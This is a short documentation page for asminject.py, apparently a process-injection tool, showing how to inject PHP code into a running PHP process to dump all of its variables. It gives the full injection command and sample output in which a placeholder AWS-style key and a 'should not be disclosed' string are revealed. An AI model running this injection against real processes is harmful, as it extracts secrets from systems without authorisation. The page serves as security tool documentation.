# asminject.py examples - PHP
* [Write all variables to standard out](#write-all-variables-to-standard-out)

## Write all variables to standard out

Use [the following PHP code, which was based on this Stack Overflow discussion](https://stackoverflow.com/questions/1005021/in-php-is-there-a-way-to-dump-all-variable-names-with-their-corresponding-valu)

```
var_dump(get_defined_vars());
```

e.g.

```
python3 ./asminject.py 249986 execute_php_code.s --arch x86-64 \
   --relative-offsets-from-binaries --stop-method "slow" \
   --var phpcode "var_dump(get_defined_vars());" \
   --var phpname PHP
```


Example output:

```
2022-06-09T16:18:04-0700 - Loop count 8
array(11) {
  ["_GET"]=>
  array(0) {
  }
  ["_POST"]=>
  array(0) {
  }
  ["_COOKIE"]=>
  array(0) {
  }
  ["_FILES"]=>
  array(0) {
  }
  ["argv"]=>
  array(1) {
    [0]=>
    string(21) "practice/php_loop.php"
  }
...omitted for brevity...
["example_global_var_1"]=>
  string(20) "AKIASADF9370235SUAS0"
  ["example_global_var_2"]=>
  string(34) "This value should not be disclosed"
  ["x"]=>
  int(8)
  ["current_timestamp"]=>
  string(24) "2022-06-09T16:18:04-0700"
}
2022-06-09T16:18:13-0700 - Loop count 9
```
